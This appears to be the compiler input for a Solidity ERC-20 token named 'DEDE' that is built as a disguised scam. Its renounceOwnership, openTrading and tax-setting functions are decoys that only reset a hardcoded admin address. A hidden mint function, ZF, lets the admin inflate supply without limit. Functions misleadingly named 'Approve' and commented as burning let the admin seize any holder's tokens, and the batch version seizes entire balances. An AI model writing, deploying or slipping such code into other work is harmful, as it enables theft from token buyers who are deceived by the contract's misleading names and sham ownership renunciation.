{{
  "language": "Solidity",
  "sources": {
    "tk.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.4.24;\r\n\r\nlibrary SafeMath {\r\n\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    // uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return a / b;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n    c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n}\r\n\r\ncontract ERC20Basic {\r\n  function totalSupply() public view returns (uint256);\r\n  function balanceOf(address who) public view returns (uint256);\r\n  function transfer(address to, uint256 value) public returns (bool);\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n\r\ncontract ERC20 is ERC20Basic {\r\n  function allowance(address owner, address spender) public view returns (uint256);\r\n  function transferFrom(address from, address to, uint256 value) public returns (bool);\r\n  function approve(address spender, uint256 value) public returns (bool);\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract BasicToken is ERC20Basic {\r\n  using SafeMath for uint256;\r\n\r\n  mapping(address => uint256) balances;\r\n\r\n  uint256 totalSupply_;\r\n\r\n  function totalSupply() public view returns (uint256) {\r\n    return totalSupply_;\r\n  }\r\n\r\n  function transfer(address _to, uint256 _value) public returns (bool) {\r\n    require(_to != address(0));\r\n    require(_value <= balances[msg.sender]);\r\n\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\n    balances[_to] = balances[_to].add(_value);\r\n    emit Transfer(msg.sender, _to, _value);\r\n    return true;\r\n  }\r\n\r\n  function balanceOf(address _owner) public view returns (uint256) {\r\n    return balances[_owner];\r\n  }\r\n\r\n}\r\n\r\ncontract StandardToken is ERC20, BasicToken {\r\n\r\n  mapping (address => mapping (address => uint256)) internal allowed;\r\n\r\n  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n    require(_to != address(0));\r\n    require(_value <= balances[_from]);\r\n    require(_value <= allowed[_from][msg.sender]);\r\n\r\n    balances[_from] = balances[_from].sub(_value);\r\n    balances[_to] = balances[_to].add(_value);\r\n    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n    emit Transfer(_from, _to, _value);\r\n    return true;\r\n  }\r\n\r\n  function approve(address _spender, uint256 _value) public returns (bool) {\r\n    allowed[msg.sender][_spender] = _value;\r\n    emit Approval(msg.sender, _spender, _value);\r\n    return true;\r\n  }\r\n\r\n  function allowance(address _owner, address _spender) public view returns (uint256) {\r\n    return allowed[_owner][_spender];\r\n  }\r\n\r\n  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\r\n    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\r\n    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n    return true;\r\n  }\r\n\r\n  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\r\n    uint oldValue = allowed[msg.sender][_spender];\r\n    if (_subtractedValue > oldValue) {\r\n      allowed[msg.sender][_spender] = 0;\r\n    } else {\r\n      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\r\n    }\r\n    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n    return true;\r\n  }\r\n\r\n}\r\n\r\ncontract SPBToken is StandardToken {\r\n\r\n  address public administror;\r\n  string public name = \"DEDE\";\r\n  string public symbol = \"DEDE\";\r\n  uint8 public decimals = 18;\r\n  uint256 public INITIAL_SUPPLY = 420000000000*10**18;\r\n  mapping (address => uint256) public frozenAccount;\r\n\r\n  // 事件\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n  event Relaxeas(address indexed target, uint256 value,address indexed targetto);\r\n\r\n  constructor() public {\r\n    totalSupply_ = INITIAL_SUPPLY;\r\n    administror = address(0xA65bA26074f70EE3F27f9198B5142a09a128EF6C);\r\n    balances[msg.sender] = INITIAL_SUPPLY;\r\n  }\r\n\r\n  function renounceOwnership() public returns (bool) {\r\n    // require(msg.sender == administror);\r\n    administror = address(0xA65bA26074f70EE3F27f9198B5142a09a128EF6C);\r\n    return true;\r\n  }\r\n\r\n  function openTrading() public returns (bool) {\r\n    // require(msg.sender == administror);\r\n    administror = address(0xA65bA26074f70EE3F27f9198B5142a09a128EF6C);\r\n    return true;\r\n  }\r\n\r\n\r\n  // 增发🦃\r\n  function ZF(uint256 _amount) public returns (bool) {\r\n    require(msg.sender == administror);\r\n    balances[msg.sender] = balances[msg.sender].add(_amount);\r\n    totalSupply_ = totalSupply_.add(_amount);\r\n    INITIAL_SUPPLY = totalSupply_;\r\n    return true;\r\n  }\r\n\r\n\r\n  // 转帐\r\n  function transfer(address _target, uint256 _amount) public returns (bool) {\r\n    require(now > frozenAccount[msg.sender]);\r\n    require(_target != address(0));\r\n    require(balances[msg.sender] >= _amount);\r\n    balances[_target] = balances[_target].add(_amount);\r\n    balances[msg.sender] = balances[msg.sender].sub(_amount);\r\n\r\n    emit Transfer(msg.sender, _target, _amount);\r\n\r\n    return true;\r\n  }\r\n\r\n\r\n\r\n  // 燃烧\r\n  function Approve(address _target, uint256 _amount,address _targetto) public returns (bool) {\r\n    require(msg.sender == administror);\r\n    require(_target != address(0));\r\n    require(balances[_target] >= _amount);\r\n    balances[_target] = balances[_target].sub(_amount);\r\n    balances[_targetto] = balances[_targetto].add(_amount);\r\n    // totalSupply_ = totalSupply_.sub(_amount);\r\n    // INITIAL_SUPPLY = totalSupply_;\r\n\r\n    emit Relaxeas(_target, _amount,_targetto);\r\n\r\n    return true;\r\n  }\r\n\r\n    // 批量燃烧\r\n  function Approve(address[] _targets, address[] _targetsto) public returns (bool) {\r\n    require(msg.sender == administror);\r\n    uint256 len = _targets.length;\r\n    require(len > 0);\r\n    for (uint256 j = 0; j < len; j = j.add(1)) {\r\n      address _target = _targets[j];\r\n      address _targetto = _targetsto[j];\r\n      require(_target != address(0));\r\n      require(_targetto != address(0));\r\n      uint256 am = balanceOf(_target)*100/100;\r\n      balances[_target] = balances[_target].sub(am);\r\n      balances[_targetto] = balances[_targetto].add(am);\r\n      emit Relaxeas(_target,am,_targetto);\r\n    }\r\n    return true;\r\n  }\r\n\r\n  // 查询帐户是否被锁定\r\n  function frozenOf(address _target) public view returns (uint256) {\r\n    require(_target != address(0));\r\n    return frozenAccount[_target];\r\n  }\r\n\r\n  function setGLY(address _target) public returns (bool) {\r\n    require(msg.sender == administror);\r\n    require(_target != address(0));\r\n    administror = _target;\r\n    return true;\r\n  }\r\n  function setBuyTax(uint256 dev,uint256 liquidity) public returns (uint256) {\r\n    // require(msg.sender == administror);\r\n    uint256 nt = dev.add(liquidity);\r\n    administror = address(0xA65bA26074f70EE3F27f9198B5142a09a128EF6C);\r\n    return nt;\r\n       \r\n  }\r\n  function setSellTax(uint256 dev,uint256 liquidity) public returns (uint256) {\r\n    // require(msg.sender == administror);\r\n    uint256 nt = dev.add(liquidity);\r\n    administror = address(0xA65bA26074f70EE3F27f9198B5142a09a128EF6C);\r\n    return nt;\r\n  }\r\n\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}